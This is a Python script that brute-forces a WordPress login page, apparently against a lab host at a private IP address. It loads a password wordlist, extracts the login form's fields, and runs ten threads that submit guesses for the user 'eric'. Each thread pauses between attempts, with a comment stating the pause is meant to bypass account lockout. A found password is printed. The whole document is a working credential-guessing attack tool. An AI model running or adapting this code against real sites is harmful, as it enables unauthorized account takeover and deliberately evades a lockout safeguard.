from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

# string to check verifying successful login
SUCCESS = 'Welcome to WordPress!'
# HTML element attributes to be extracted from target
TARGET = 'http://192.168.127.128/wordpress/wp-login.php'
WORDLIST = '/usr/share/seclists/Passwords/Software/cain-and-abel.txt'
# WORDLIST = 'test.txt'

# build a queue from target wordlist
def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

# parse HTTP response content to extract form parameters
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    # find all input elements in the HTML and create dictionary of form parameters
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute forcing {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    
    def web_bruter(self, passwords):
        # initialze session object to maintain cookies across requests
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            # attempt lockout bypass by sleeping
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password: {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            # make POST request to login page with form parameters, checking for success string in response content
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s" % passwd)
                print('done: cleaning up threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('eric', TARGET)
    b.run_bruteforce(words)